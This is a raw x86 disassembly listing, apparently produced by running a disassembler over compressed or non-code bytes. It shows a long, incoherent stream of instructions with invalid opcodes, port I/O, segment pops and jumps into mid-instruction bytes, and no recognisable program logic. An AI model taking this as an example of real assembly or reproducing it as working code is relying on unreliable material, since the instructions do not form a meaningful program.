1315b8d6:	b6 f6                	mov    $0xf6,%dh
1315b8d8:	53                   	push   %ebx
1315b8d9:	bc 54 78 00 74       	mov    $0x74007854,%esp
1315b8de:	08 2e                	or     %ch,(%esi)
1315b8e0:	ec                   	in     (%dx),%al
1315b8e1:	eb 06                	jmp    0x1315b8e9
1315b8e3:	07                   	pop    %es
1315b8e4:	2b 78 85             	sub    -0x7b(%eax),%edi
1315b8e7:	20 dc                	and    %bl,%ah
1315b8e9:	4a                   	dec    %edx
1315b8ea:	55                   	push   %ebp
1315b8eb:	e7 b0                	out    %eax,$0xb0
1315b8ed:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315b8ee:	68 26 94 52 8c       	push   $0x8c529426
1315b8f3:	95                   	xchg   %eax,%ebp
1315b8f4:	3b 3b                	cmp    (%ebx),%edi
1315b8f6:	37                   	aaa
1315b8f7:	b7 52                	mov    $0x52,%bh
1315b8f9:	06                   	push   %es
1315b8fa:	f8                   	clc
1315b8fb:	fd                   	std
1315b8fc:	8b 95 f4 8a b8 7f    	mov    0x7fb88af4(%ebp),%edx
1315b902:	77 3b                	ja     0x1315b93f
1315b904:	58                   	pop    %eax
1315b905:	f0 ba 08 c0 eb 79    	lock mov $0x79ebc008,%edx
1315b90b:	99                   	cltd
1315b90c:	7d 75                	jge    0x1315b983
1315b90e:	a9 3f d7 fd de       	test   $0xdefdd73f,%eax
1315b913:	a3 18 b7 a3 44       	mov    %eax,0x44a3b718
1315b918:	08 56 f3             	or     %dl,-0xd(%esi)
1315b91b:	c9                   	leave
1315b91c:	bf 48 64 0b ce       	mov    $0xce0b6448,%edi
1315b921:	76 0c                	jbe    0x1315b92f
1315b923:	b9 40 a8 5e fe       	mov    $0xfe5ea840,%ecx
1315b928:	fb                   	sti
1315b929:	0d b1 04 04 a3       	or     $0xa30404b1,%eax
1315b92e:	6e                   	outsb  %ds:(%esi),(%dx)
1315b92f:	89 5c ec 1b          	mov    %ebx,0x1b(%esp,%ebp,8)
1315b933:	20 74 44 30          	and    %dh,0x30(%esp,%eax,2)
1315b937:	0c 2e                	or     $0x2e,%al
1315b939:	50                   	push   %eax
1315b93a:	25 29 4e c2 96       	and    $0x96c24e29,%eax
1315b93f:	09 6e 0e             	or     %ebp,0xe(%esi)
1315b942:	7c d0                	jl     0x1315b914
1315b944:	3f                   	aas
1315b945:	30 02                	xor    %al,(%edx)
1315b947:	06                   	push   %es
1315b948:	76 75                	jbe    0x1315b9bf
1315b94a:	0c f0                	or     $0xf0,%al
1315b94c:	28 2c 2f             	sub    %ch,(%edi,%ebp,1)
1315b94f:	6f                   	outsl  %ds:(%esi),(%dx)
1315b950:	45                   	inc    %ebp
1315b951:	93                   	xchg   %eax,%ebx
1315b952:	5b                   	pop    %ebx
1315b953:	00 4e 6d             	add    %cl,0x6d(%esi)
1315b956:	00 70 64             	add    %dh,0x64(%eax)
1315b959:	ee                   	out    %al,(%dx)
1315b95a:	3e f7 16             	notl   %ds:(%esi)
1315b95d:	f1                   	int1
1315b95e:	2b 00                	sub    (%eax),%eax
1315b960:	5d                   	pop    %ebp
1315b961:	15 17 42 11 63       	adc    $0x63114217,%eax
1315b966:	00 6b 94             	add    %ch,-0x6c(%ebx)
1315b969:	bd ee 35 8c 1b       	mov    $0x1b8c35ee,%ebp
1315b96e:	09 65 19             	or     %esp,0x19(%ebp)
1315b971:	2f                   	das
1315b972:	26 99                	es cltd
1315b974:	b2 c9                	mov    $0xc9,%dl
1315b976:	2e 17                	cs pop %ss
1315b978:	2f                   	das
1315b979:	45                   	inc    %ebp
1315b97a:	7b 02                	jnp    0x1315b97e
1315b97c:	06                   	push   %es
1315b97d:	eb 41                	jmp    0x1315b9c0
1315b97f:	63 3b                	arpl   %edi,(%ebx)
1315b981:	45                   	inc    %ebp
1315b982:	8b 63 29             	mov    0x29(%ebx),%esp
1315b985:	6e                   	outsb  %ds:(%esi),(%dx)
1315b986:	90                   	nop
1315b987:	21 ac 74 4f 2a 30 03 	and    %ebp,0x3302a4f(%esp,%esi,2)
1315b98e:	9a a6 69 9a 31 32 33 	lcall  $0x3332,$0x319a69a6
1315b995:	34 35                	xor    $0x35,%al
1315b997:	36 9e                	ss sahf
1315b999:	b0 a6                	mov    $0xa6,%al
1315b99b:	69 37 38 39 a7 20    	imul   $0x20a73938,(%edi),%esi
1315b9a1:	00 54 7b 02          	add    %dl,0x2(%ebx,%edi,2)
1315b9a5:	26 6b 62 77 43       	imul   $0x43,%es:0x77(%edx),%esp
1315b9aa:	d7                   	xlat   %ds:(%ebx)
1315b9ab:	79 0f                	jns    0x1315b9bc
1315b9ad:	b2 ee                	mov    $0xee,%dl
1315b9af:	83 26 46             	andl   $0x46,(%esi)
1315b9b2:	0f 69 8d 68 13 7d e6 	punpckhwd -0x1982ec98(%ebp),%mm1
1315b9b9:	1e                   	push   %ds
1315b9ba:	68 52 a7 65 8d       	push   $0x8d65a752
1315b9bf:	8b 50 00             	mov    0x0(%eax),%edx
1315b9c2:	6c                   	insb   (%dx),%es:(%edi)
1315b9c3:	7d 0f                	jge    0x1315b9d4
1315b9c5:	ba cc 43 33 50       	mov    $0x503343cc,%edx
1315b9ca:	53                   	push   %ebx
1315b9cb:	fb                   	sti
1315b9cc:	73 ac                	jae    0x1315b97a
1315b9ce:	1b ec                	sbb    %esp,%ebp
1315b9d0:	cf                   	iret
1315b9d1:	01 15 0d 00 0a 1b    	add    %edx,0x1b0a000d
1315b9d7:	53                   	push   %ebx
1315b9d8:	15 6c cd 03 7d       	adc    $0x7d03cd6c,%eax
1315b9dd:	cb                   	lret
1315b9de:	5e                   	pop    %esi
1315b9df:	3d 13 c9 72 e1       	cmp    $0xe172c913,%eax
1315b9e4:	6c                   	insb   (%dx),%es:(%edi)
1315b9e5:	00 fb                	add    %bh,%bl
1315b9e7:	dc 6f 07             	fsubrl 0x7(%edi)
1315b9ea:	19 20                	sbb    %esp,(%eax)
1315b9ec:	e7 2d                	out    %eax,$0x2d
1315b9ee:	33 6d 6e             	xor    0x6e(%ebp),%ebp
1315b9f1:	5b                   	pop    %ebx
1315b9f2:	96                   	xchg   %eax,%esi
1315b9f3:	b5 0b                	mov    $0xb,%ch
1315b9f5:	5a                   	pop    %edx
1315b9f6:	33 01                	xor    (%ecx),%eax
1315b9f8:	6d                   	insl   (%dx),%es:(%edi)
1315b9f9:	84 8d 75 93 1b 41    	test   %cl,0x411b9375(%ebp)
1315b9ff:	5d                   	pop    %ebp
1315ba00:	63 53 74             	arpl   %edx,0x74(%ebx)
1315ba03:	d7                   	xlat   %ds:(%ebx)
1315ba04:	b4 bd                	mov    $0xbd,%ah
1315ba06:	80 c3 6e             	add    $0x6e,%bl
1315ba09:	3f                   	aas
1315ba0a:	c1 49 4d 5d          	rorl   $0x5d,0x4d(%ecx)
1315ba0e:	37                   	aaa
1315ba0f:	60                   	pusha
1315ba10:	1f                   	pop    %ds
1315ba11:	d1 75 1f             	shll   $1,0x1f(%ebp)
1315ba14:	61                   	popa
1315ba15:	2f                   	das
1315ba16:	73 19                	jae    0x1315ba31
1315ba18:	4c                   	dec    %esp
1315ba19:	2f                   	das
1315ba1a:	d8 60 63             	fsubs  0x63(%eax)
1315ba1d:	bb 6b 5b 44 af       	mov    $0xaf445b6b,%ebx
1315ba22:	39 63 dd             	cmp    %esp,-0x23(%ebx)
1315ba25:	d8 65 5f             	fsubs  0x5f(%ebp)
1315ba28:	72 e1                	jb     0x1315ba0b
1315ba2a:	77 2d                	ja     0x1315ba59
1315ba2c:	44                   	inc    %esp
1315ba2d:	07                   	pop    %es
1315ba2e:	6e                   	outsb  %ds:(%esi),(%dx)
1315ba2f:	e1 9d                	loope  0x1315b9ce
1315ba31:	68 09 b7 3d 0d       	push   $0xd3db709
1315ba36:	3b 0d d8 97 ec 31    	cmp    0x31ec97d8,%ecx
1315ba3c:	17                   	pop    %ss
1315ba3d:	0b 30                	or     (%eax),%esi
1315ba3f:	17                   	pop    %ss
1315ba40:	31 80 0c c8 80 0b    	xor    %eax,0xb80c80c(%eax)
1315ba46:	32 33                	xor    (%ebx),%dh
1315ba48:	c8 80 0c c8          	enter  $0xc80,$0xc8
1315ba4c:	34 35                	xor    $0x35,%al
1315ba4e:	36 0d c8 80 0c 37    	ss or  $0x370c80c8,%eax
1315ba54:	38 39                	cmp    %bh,(%ecx)
1315ba56:	03 32                	add    (%edx),%esi
1315ba58:	20 93 83 32 32 32    	and    %dl,0x32323283(%ebx)
1315ba5e:	20 03                	and    %al,(%ebx)
1315ba60:	32 20                	xor    (%eax),%ah
1315ba62:	32 32                	xor    (%edx),%dh
1315ba64:	9c                   	pushf
1315ba65:	cd 02                	int    $0x2
1315ba67:	32 32                	xor    (%edx),%dh
1315ba69:	15 0b 34 80 0c       	adc    $0xc80340b,%eax
1315ba6e:	c8 80 35 36          	enter  $0x3580,$0x36
1315ba72:	c9                   	leave
1315ba73:	80 0c c8 37          	orb    $0x37,(%eax,%ecx,8)
1315ba77:	38 39                	cmp    %bh,(%ecx)
1315ba79:	87 80 8d 30 48 5b    	xchg   %eax,0x5b48308d(%eax)
1315ba7f:	70 0f                	jo     0x1315ba90
1315ba81:	c5 a2 87 99 84 65    	lds    0x65849987(%edx),%esp
1315ba87:	4b                   	dec    %ebx
1315ba88:	49                   	dec    %ecx
1315ba89:	67 cc                	addr16 int3
1315ba8b:	35 87 e0 0d a7       	xor    $0xa70de087,%eax
1315ba90:	4d                   	dec    %ebp
1315ba91:	69 35 0f c3 60 dd b6 	imul   $0x11641fb6,0xdd60c30f,%esi
1315ba98:	1f 64 11 
1315ba9b:	61                   	popa
1315ba9c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315ba9d:	4c                   	dec    %esp
1315ba9e:	e1 f0                	loope  0x1315ba90
1315baa0:	1e                   	push   %ds
1315baa1:	c1 48 66 43          	rorl   $0x43,0x66(%eax)
1315baa5:	a9 29 c2 de b0       	test   $0xb0dec229,%eax
1315baaa:	91                   	xchg   %eax,%ecx
1315baab:	b3 23                	mov    $0x23,%bl
1315baad:	19 33                	sbb    %esi,(%ebx)
1315baaf:	4c                   	dec    %esp
1315bab0:	c6                   	(bad)
1315bab1:	65 ee                	gs out %al,(%dx)
1315bab3:	41                   	inc    %ecx
1315bab4:	2f                   	das
1315bab5:	17                   	pop    %ss
1315bab6:	4e                   	dec    %esi
1315bab7:	2d 54 1a 18 c9       	sub    $0xc9181a54,%eax
1315babc:	78 9b                	js     0x1315ba59
1315babe:	15 f3 21 bd 2f       	adc    $0x2fbd21f3,%eax
1315bac3:	7a b3                	jp     0x1315ba78
1315bac5:	20 9b 75 ab 03 b0    	and    %bl,-0x4ffc548b(%ebx)
1315bacb:	77 a8                	ja     0x1315ba75
1315bacd:	2d 0d 76 29 19       	sub    $0x1929760d,%eax
1315bad2:	43                   	inc    %ebx
1315bad3:	65 27                	gs daa
1315bad5:	17                   	pop    %ss
1315bad6:	0d d9 6d cb 69       	or     $0x69cb6dd9,%eax
1315badb:	73 63                	jae    0x1315bb40
1315badd:	cd 6f                	int    $0x6f
1315badf:	65 bb 68 2b fd 67    	gs mov $0x67fd2b68,%ebx
1315bae5:	ef                   	out    %eax,(%dx)
1315bae6:	5a                   	pop    %edx
1315bae7:	18 ef                	sbb    %ch,%bh
1315bae9:	25 61 0d 71 d8       	and    $0xd8710d61,%eax
1315baee:	5b                   	pop    %ebx
1315baef:	18 43 1f             	sbb    %al,0x1f(%ebx)
1315baf2:	b5 17                	mov    $0x17,%ch
1315baf4:	91                   	xchg   %eax,%ecx
1315baf5:	53                   	push   %ebx
1315baf6:	f6 34 5b             	divb   (%ebx,%ebx,2)
1315baf9:	8f c9 74 4f          	(bad)
1315bafd:	55                   	push   %ebp
1315bafe:	12 ba a7 60 81 d7    	adc    -0x287e9f59(%edx),%bh
1315bb04:	69 13 68 3d d9 b2    	imul   $0xb2d93d68,(%ebx),%edx
1315bb0a:	91                   	xchg   %eax,%ecx
1315bb0b:	90                   	nop
1315bb0c:	3f                   	aas
1315bb0d:	27                   	daa
1315bb0e:	37                   	aaa
1315bb0f:	8c 7a 4b             	mov    %?,0x4b(%edx)
1315bb12:	58                   	pop    %eax
1315bb13:	41                   	inc    %ecx
1315bb14:	df 5d 4e             	fistps 0x4e(%ebp)
1315bb17:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315bb18:	01 6c 6c 9f          	add    %ebp,-0x61(%esp,%ebp,2)
1315bb1c:	53                   	push   %ebx
1315bb1d:	55                   	push   %ebp
1315bb1e:	a3 d8 17 6c ca       	mov    %eax,0xca6c17d8
1315bb23:	9f                   	lahf
1315bb24:	20 37                	and    %dh,(%edi)
1315bb26:	1d 6e 7f e1 7d       	sbb    $0x7de17f6e,%eax
1315bb2b:	c3                   	ret
1315bb2c:	12 b1 17 56 5f 03    	adc    0x35f5617(%ecx),%dh
1315bb32:	60                   	pusha
1315bb33:	c8 56 c2 1b          	enter  $0xc256,$0x1b
1315bb37:	1b 4d 2e             	sbb    0x2e(%ebp),%ecx
1315bb3a:	21 65 4b             	and    %esp,0x4b(%ebp)
1315bb3d:	3f                   	aas
1315bb3e:	1b 03                	sbb    (%ebx),%eax
1315bb40:	00 ea                	add    %ch,%dl
1315bb42:	1e                   	push   %ds
1315bb43:	94                   	xchg   %eax,%esp
1315bb44:	b0 71                	mov    $0x71,%al
1315bb46:	9c                   	pushf
1315bb47:	21 79 91             	and    %edi,-0x6f(%ecx)
1315bb4a:	5b                   	pop    %ebx
1315bb4b:	09 cc                	or     %ecx,%esp
1315bb4d:	07                   	pop    %es
1315bb4e:	dd 1f                	fstpl  (%edi)
1315bb50:	d9 40 70             	flds   0x70(%eax)
1315bb53:	3e a7                	cmpsl  %es:(%edi),%ds:(%esi)
1315bb55:	e0 fe                	loopne 0x1315bb55
1315bb57:	94                   	xchg   %eax,%esp
1315bb58:	9a 8c f0 de 28 26 10 	lcall  $0x1026,$0x28def08c
1315bb5f:	52                   	push   %edx
1315bb60:	7d ec                	jge    0x1315bb4e
1315bb62:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315bb63:	00 21                	add    %ah,(%ecx)
1315bb65:	b8 fb 50 05 85       	mov    $0x850550fb,%eax
1315bb6a:	9a 30 81 7d 0c fa af 	lcall  $0xaffa,$0xc7d8130
1315bb71:	da 4c b7 74          	fimull 0x74(%edi,%esi,4)
1315bb75:	0d 08 00 15 84       	or     $0x84150008,%eax
1315bb7a:	c1 04 87 44          	roll   $0x44,(%edi,%eax,4)
1315bb7e:	7f 43                	jg     0x1315bbc3
1315bb80:	ba 0c 01 ca e8       	mov    $0xe8ca010c,%edx
1315bb85:	15 0d 7e 67 7c       	adc    $0x7c677e0d,%eax
1315bb8a:	61                   	popa
1315bb8b:	04 3c                	add    $0x3c,%al
1315bb8d:	2c bb                	sub    $0xbb,%al
1315bb8f:	2b 05 47 36 08 3c    	sub    0x3c083647,%eax
1315bb95:	54                   	push   %esp
1315bb96:	3c 3c                	cmp    $0x3c,%al
1315bb98:	b3 60                	mov    $0x60,%bl
1315bb9a:	6d                   	insl   (%dx),%es:(%edi)
1315bb9b:	96                   	xchg   %eax,%esi
1315bb9c:	2d 76 ec 89 36       	sub    $0x3689ec76,%eax
1315bba1:	08 f0                	or     %dh,%al
1315bba3:	e4 6a                	in     $0x6a,%al
1315bba5:	40                   	inc    %eax
1315bba6:	93                   	xchg   %eax,%ebx
1315bba7:	a0 f7 04 8f 68       	mov    0x688f04f7,%al
1315bbac:	46                   	inc    %esi
1315bbad:	91                   	xchg   %eax,%ecx
1315bbae:	8f                   	(bad)
1315bbaf:	e2 6d                	loop   0x1315bc1e
1315bbb1:	44                   	inc    %esp
1315bbb2:	18 95 23 ec 1c 5b    	sbb    %dl,0x5b1cec23(%ebp)
1315bbb8:	e2 45                	loop   0x1315bbff
1315bbba:	72 a9                	jb     0x1315bb65
1315bbbc:	53                   	push   %ebx
1315bbbd:	20 a1 80 8f b9 d8    	and    %ah,-0x27467080(%ecx)
1315bbc3:	54                   	push   %esp
1315bbc4:	5d                   	pop    %ebp
1315bbc5:	a1 bc 9e 5a 94       	mov    0x945a9ebc,%eax
1315bbca:	64 8f                	fs (bad)
1315bbcc:	9c                   	pushf
1315bbcd:	bb 14 bc 05 f1       	mov    $0xf105bc14,%ebx
1315bbd2:	de 68 a1             	fisubrs -0x5f(%eax)
1315bbd5:	c5 bf 15 37 d5 a9    	lds    -0x562ac8eb(%edi),%edi
1315bbdb:	02 0a                	add    (%edx),%cl
1315bbdd:	a1 1c c1 89 c1       	mov    0xc189c11c,%eax
1315bbe2:	00 26                	add    %ah,(%esi)
1315bbe4:	89 7d e1             	mov    %edi,-0x1f(%ebp)
1315bbe7:	0f 9e 01             	setle  (%ecx)
1315bbea:	a2 05 c3 1f 44       	mov    %al,0x441fc305
1315bbef:	92                   	xchg   %eax,%edx
1315bbf0:	cd 44                	int    $0x44
1315bbf2:	34 ee                	xor    $0xee,%al
1315bbf4:	2e 56                	cs push %esi
1315bbf6:	84 05 ef e6 16 1d    	test   %al,0x1d16e6ef
1315bbfc:	68 ee 74 0b a1       	push   $0xa10b74ee
1315bc01:	07                   	pop    %es
1315bc02:	ee                   	out    %al,(%dx)
1315bc03:	95                   	xchg   %eax,%ebp
1315bc04:	02 22                	add    (%edx),%ah
1315bc06:	4f                   	dec    %edi
1315bc07:	8a 0c 06             	mov    (%esi,%eax,1),%cl
1315bc0a:	a8 4e                	test   $0x4e,%al
1315bc0c:	82 7a 27 7b          	cmpb   $0x7b,0x27(%edx)
1315bc10:	f0 8a 0c f5 d7 34 1d 	lock mov -0x3be2cb29(,%esi,8),%cl
1315bc17:	c4 
1315bc18:	68 ff ac 0f d5       	push   $0xd50facff
1315bc1d:	05 4d 4b 8d 08       	add    $0x88d4b4d,%eax
1315bc22:	32 3a                	xor    (%edx),%bh
1315bc24:	58                   	pop    %eax
1315bc25:	ac                   	lods   %ds:(%esi),%al
1315bc26:	f0 93                	lock xchg %eax,%ebx
1315bc28:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315bc29:	66 c7 04 43 b5 25    	movw   $0x25b5,(%ebx,%eax,2)
1315bc2f:	11 4d 72             	adc    %ecx,0x72(%ebp)
1315bc32:	d8 36                	fdivs  (%esi)
1315bc34:	8d 10                	lea    (%eax),%edx
1315bc36:	50                   	push   %eax
1315bc37:	2f                   	das
1315bc38:	08 f4                	or     %dh,%ah
1315bc3a:	22 4f a8             	and    -0x58(%edi),%cl
1315bc3d:	47                   	inc    %edi
1315bc3e:	84 4b 00             	test   %cl,0x0(%ebx)
1315bc41:	f1                   	int1
1315bc42:	40                   	inc    %eax
1315bc43:	17                   	pop    %ss
1315bc44:	96                   	xchg   %eax,%esi
1315bc45:	aa                   	stos   %al,%es:(%edi)
1315bc46:	14 7d                	adc    $0x7d,%al
1315bc48:	98                   	cwtl
1315bc49:	5d                   	pop    %ebp
1315bc4a:	0c 25                	or     $0x25,%al
1315bc4c:	82 df 2b             	sbb    $0x2b,%bh
1315bc4f:	96                   	xchg   %eax,%esi
1315bc50:	d9 a2 0c 89 27 c3    	fldenv -0x3cd876f4(%edx)
1315bc56:	26 b7 e5             	es mov $0xe5,%bh
1315bc59:	1d 88 d6 35 ad       	sbb    $0xad35d688,%eax
1315bc5e:	1c c1                	sbb    $0xc1,%al
1315bc60:	f2 1b 45 80          	repnz sbb -0x80(%ebp),%eax
1315bc64:	de 3c bc             	fidivrs (%esp,%edi,4)
1315bc67:	d6                   	salc
1315bc68:	af                   	scas   %es:(%edi),%eax
1315bc69:	f4                   	hlt
1315bc6a:	8b e1                	mov    %ecx,%esp
1315bc6c:	1d 09 72 14 13       	sbb    $0x13147209,%eax
1315bc71:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315bc72:	a3 21 0d 04 17       	mov    %eax,0x17040d21
1315bc77:	cc                   	int3
1315bc78:	b6 83                	mov    $0x83,%dh
1315bc7a:	1e                   	push   %ds
1315bc7b:	3c 80                	cmp    $0x80,%al
1315bc7d:	c9                   	leave
1315bc7e:	15 03 27 a1 5e       	adc    $0x5ea12703,%eax
1315bc83:	3c f4                	cmp    $0xf4,%al
1315bc85:	f3 85 94 0a f7 58 d4 	repz test %edx,0x49d458f7(%edx,%ecx,1)
1315bc8c:	49 
1315bc8d:	76 0f                	jbe    0x1315bc9e
1315bc8f:	d2 07                	rolb   %cl,(%edi)
1315bc91:	00 f5                	add    %dh,%ch
1315bc93:	02 6c 3f 2c          	add    0x2c(%edi,%edi,1),%ch
1315bc97:	1c c7                	sbb    $0xc7,%al
1315bc99:	a0 dc c4 c8 8b       	mov    0x8bc8c4dc,%al
1315bc9e:	de cd                	fmulp  %st,%st(5)
1315bca0:	92                   	xchg   %eax,%edx
1315bca1:	20 ce                	and    %cl,%dh
1315bca3:	80 22 a0             	andb   $0xa0,(%edx)
1315bca6:	47                   	inc    %edi
1315bca7:	53                   	push   %ebx
1315bca8:	0f db 6c 69 a5       	pand   -0x5b(%ecx,%ebp,2),%mm5
1315bcad:	ac                   	lods   %ds:(%esi),%al
1315bcae:	50                   	push   %eax
1315bcaf:	34 06                	xor    $0x6,%al
1315bcb1:	8d                   	lea    (bad),%esp
1315bcb2:	e5 66                	in     $0x66,%eax
1315bcb4:	d0 1b                	rcrb   $1,(%ebx)
1315bcb6:	6b 14 d0 06          	imul   $0x6,(%eax,%edx,8),%edx
1315bcba:	85 37                	test   %esi,(%edi)
1315bcbc:	3b 48 13             	cmp    0x13(%eax),%ecx
1315bcbf:	f4                   	hlt
1315bcc0:	ed                   	in     (%dx),%eax
1315bcc1:	fc                   	cld
1315bcc2:	a3 2c 15 68 6c       	mov    %eax,0x6c68152c
1315bcc7:	f6 bd a8 d9 77 3f    	idivb  0x3f77d9a8(%ebp)
1315bccd:	1d 4c 0f ba cd       	sbb    $0xcdba0f4c,%eax
1315bcd2:	85 60 7e             	test   %esp,0x7e(%eax)
1315bcd5:	61                   	popa
1315bcd6:	b0 be                	mov    $0xbe,%al
1315bcd8:	04 22                	add    $0x22,%al
1315bcda:	95                   	xchg   %eax,%ebp
1315bcdb:	2f                   	das
1315bcdc:	e8 35 7c b8 6c       	call   0x7fce3916
1315bce1:	89 b9 32 49 b9 95    	mov    %edi,-0x6a46b6ce(%ecx)
1315bce7:	2d 14 8f 19 18       	sub    $0x18198f14,%eax
1315bcec:	94                   	xchg   %eax,%esp
1315bced:	13 46 f6             	adc    -0xa(%esi),%eax
1315bcf0:	52                   	push   %edx
1315bcf1:	21 12                	and    %edx,(%edx)
1315bcf3:	33 db                	xor    %ebx,%ebx
1315bcf5:	ce                   	into
1315bcf6:	dd 3f                	fnstsw (%edi)
1315bcf8:	1a 76 b6             	sbb    -0x4a(%esi),%dh
1315bcfb:	ff 50 6d             	call   *0x6d(%eax)
1315bcfe:	63 2f                	arpl   %ebp,(%edi)
1315bd00:	77 09                	ja     0x1315bd0b
1315bd02:	0f 82 05 43 43 13    	jb     0x2659000d
1315bd08:	d4 b4                	aam    $0xb4
1315bd0a:	42                   	inc    %edx
1315bd0b:	50                   	push   %eax
1315bd0c:	47                   	inc    %edi
1315bd0d:	c5 48 f7             	lds    -0x9(%eax),%ecx
1315bd10:	a3 34 c5 62 98       	mov    %eax,0x9862c534
1315bd15:	ca 3d ba             	lret   $0xba3d
1315bd18:	d4 c0                	aam    $0xc0
1315bd1a:	58                   	pop    %eax
1315bd1b:	d0 12                	rclb   $1,(%edx)
1315bd1d:	0a d8                	or     %al,%bl
1315bd1f:	28 fb                	sub    %bh,%bl
1315bd21:	93                   	xchg   %eax,%ebx
1315bd22:	60                   	pusha
1315bd23:	19 5a 9e             	sbb    %ebx,-0x62(%edx)
1315bd26:	29 9b 9d 16 a1 3e    	sub    %ebx,0x3ea1169d(%ebx)
1315bd2c:	d8 0a                	fmuls  (%edx)
1315bd2e:	c8 2e c2 42          	enter  $0xc22e,$0x42
1315bd32:	8f 49 7c ec          	(bad)
1315bd36:	00 7b 09             	add    %bh,0x9(%ebx)
1315bd39:	79 00                	jns    0x1315bd3b
1315bd3b:	f3 0e                	repz push %cs
1315bd3d:	88 ce                	mov    %cl,%dh
1315bd3f:	67 8b 3d             	mov    (%di),%edi
1315bd42:	c6 05 c5 06 49 80 3d 	movb   $0x3d,0x804906c5
1315bd49:	b0 15                	mov    $0x15,%al
1315bd4b:	99                   	cltd
1315bd4c:	e9 e0 98 d7 b2       	jmp    0xc5ed5631
1315bd51:	17                   	pop    %ss
1315bd52:	32 d9                	xor    %cl,%bl
1315bd54:	a2 3e f5 f5 d5       	mov    %al,0xd5f5f53e
1315bd59:	73 63                	jae    0x1315bdbe
1315bd5b:	20 f2                	and    %dh,%dl
1315bd5d:	c0 c0 47             	rol    $0x47,%al
1315bd60:	90                   	nop
1315bd61:	87 35 b2 ab cc 3e    	xchg   %esi,0x3eccabb2
1315bd67:	47                   	inc    %edi
1315bd68:	0a 02                	or     (%edx),%al
1315bd6a:	92                   	xchg   %eax,%edx
1315bd6b:	f5                   	cmc
1315bd6c:	aa                   	stos   %al,%es:(%edi)
1315bd6d:	97                   	xchg   %eax,%edi
1315bd6e:	36 a6                	cmpsb  %es:(%edi),%ss:(%esi)
1315bd70:	47                   	inc    %edi
1315bd71:	1c 32                	sbb    $0x32,%al
1315bd73:	b2 e4                	mov    $0xe4,%dl
1315bd75:	0c f0                	or     $0xf0,%al
1315bd77:	94                   	xchg   %eax,%esp
1315bd78:	c0 7c 8f 14 84       	sarb   $0x84,0x14(%edi,%ecx,4)
1315bd7d:	20 20                	and    %ah,(%eax)
1315bd7f:	2e 20 81 fb 08 23 48 	and    %al,%cs:0x482308fb(%ecx)
1315bd86:	ae                   	scas   %es:(%edi),%al
1315bd87:	af                   	scas   %es:(%edi),%eax
1315bd88:	03 ea                	add    %edx,%ebp
1315bd8a:	ac                   	lods   %ds:(%esi),%al
1315bd8b:	77 61                	ja     0x1315bdee
1315bd8d:	31 b9 8d 6c 6e 3b    	xor    %edi,0x3b6e6c8d(%ecx)
1315bd93:	3c 72                	cmp    $0x72,%al
1315bd95:	d0 0c 2d d0 c0 a6 a6 	rorb   $1,-0x59593f30(,%ebp,1)
1315bd9c:	82 0f b8             	orb    $0xb8,(%edi)
1315bd9f:	30 93 43 f4 4a 07    	xor    %dl,0x74af443(%ebx)
1315bda5:	88 9f 90 f1 4d e8    	mov    %bl,-0x17b20e70(%edi)
1315bdab:	8d 55 f4             	lea    -0xc(%ebp),%edx
1315bdae:	97                   	xchg   %eax,%edi
1315bdaf:	b5 05                	mov    $0x5,%ch
1315bdb1:	ce                   	into
1315bdb2:	f6 4e 48 3c          	testb  $0x3c,0x48(%esi)
1315bdb6:	01 4e f9             	add    %ecx,-0x7(%esi)
1315bdb9:	61                   	popa
1315bdba:	00 3e                	add    %bh,(%esi)
1315bdbc:	ab                   	stos   %eax,%es:(%edi)
1315bdbd:	b2 11                	mov    $0x11,%dl
1315bdbf:	b0 05                	mov    $0x5,%al
1315bdc1:	e8 f7 e9 7a ac       	call   0xbf90a7bd
1315bdc6:	ca b8 55             	lret   $0x55b8
1315bdc9:	cb                   	lret
1315bdca:	e1 01                	loope  0x1315bdcd
1315bdcc:	73 72                	jae    0x1315be40
1315bdce:	05 f2 3c b5 e4       	add    $0xe4b53cf2,%eax
1315bdd3:	16                   	push   %ss
1315bdd4:	f1                   	int1
1315bdd5:	10 72 21             	adc    %dh,0x21(%edx)
1315bdd8:	47                   	inc    %edi
1315bdd9:	f1                   	int1
1315bdda:	f1                   	int1
1315bddb:	06                   	push   %es
1315bddc:	c2 da 76             	ret    $0x76da
1315bddf:	8b ea                	mov    %edx,%ebp
1315bde1:	8b f0                	mov    %eax,%esi
1315bde3:	ad                   	lods   %ds:(%esi),%eax
1315bde4:	fc                   	cld
1315bde5:	85 b1 08 f9 e1 1e    	test   %esi,0x1ee1f908(%ecx)
1315bdeb:	e6 90                	out    %al,$0x90
1315bded:	07                   	pop    %es
1315bdee:	06                   	push   %es
1315bdef:	6b d8 84             	imul   $0xffffff84,%eax,%ebx
1315bdf2:	15 1d b3 fd 0c       	adc    $0xcfdb31d,%eax
1315bdf7:	0c bc                	or     $0xbc,%al
1315bdf9:	0c eb                	or     $0xeb,%al
1315bdfb:	77 24                	ja     0x1315be21
1315bdfd:	8c b6 81 6f c9 1b    	mov    %?,0x1bc96f81(%esi)
1315be03:	0f 40 54 eb 5b       	cmovo  0x5b(%ebx,%ebp,8),%edx
1315be08:	24 c3                	and    $0xc3,%al
1315be0a:	e0 d9                	loopne 0x1315bde5
1315be0c:	be 06 54 22 90       	mov    $0x90225406,%esi
1315be11:	4c                   	dec    %esp
1315be12:	0b 4e 06             	or     0x6(%esi),%ecx
1315be15:	91                   	xchg   %eax,%ecx
1315be16:	80 43 ec 11          	addb   $0x11,-0x14(%ebx)
1315be1a:	3b 64 b2 b9          	cmp    -0x47(%edx,%esi,4),%esp
1315be1e:	f7 cb 0a 4c c7 05    	test   $0x5c74c0a,%ebx
1315be24:	20 47 00             	and    %al,0x0(%edi)
1315be27:	09 24 75 ef b3 63 27 	or     %esp,0x2763b3ef(,%esi,2)
1315be2e:	63 ee                	arpl   %ebp,%esi
1315be30:	0a a1 1b 26 62 1c    	or     0x1c62261b(%ecx),%ah
1315be36:	c1 c0 45             	rol    $0x45,%eax
1315be39:	26 83 aa 84 82 93 02 	subl   $0x3b,%es:0x2938284(%edx)
1315be40:	3b 
1315be41:	e0 03                	loopne 0x1315be46
1315be43:	11 18                	adc    %ebx,(%eax)
1315be45:	18 9c 14 50 c0 e6 88 	sbb    %bl,-0x77193fb0(%esp,%edx,1)
1315be4c:	ff a0 7a 29 6f c8    	jmp    *-0x3790d686(%eax)
